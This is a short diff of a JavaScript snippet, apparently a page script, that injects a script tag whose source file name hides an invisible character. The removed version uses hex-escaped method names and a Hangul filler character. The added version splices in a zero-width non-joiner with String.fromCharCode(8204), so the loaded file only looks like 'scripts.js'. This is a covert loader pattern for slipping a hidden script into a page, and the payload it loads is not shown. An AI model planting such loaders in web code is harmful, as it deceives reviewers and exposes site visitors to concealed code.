@@ -1,5 +1,5 @@
 (function() {
-    var _0xabc123 = document['\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74']('\x73\x63\x72\x69\x70\x74');
-    _0xabc123['\x73\x72\x63'] = '\x73\x63\x72\x69\x70\x74ㅤ.\x6A\x73';
-    document['\x62\x6F\x64\x79']['\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64'](_0xabc123);
+    var _0x1a2b3c = document['createElement']('script');
+    _0x1a2b3c['src'] = 'scripts' + String.fromCharCode(8204) + '.js';
+    document['body']['appendChild'](_0x1a2b3c);
 })();
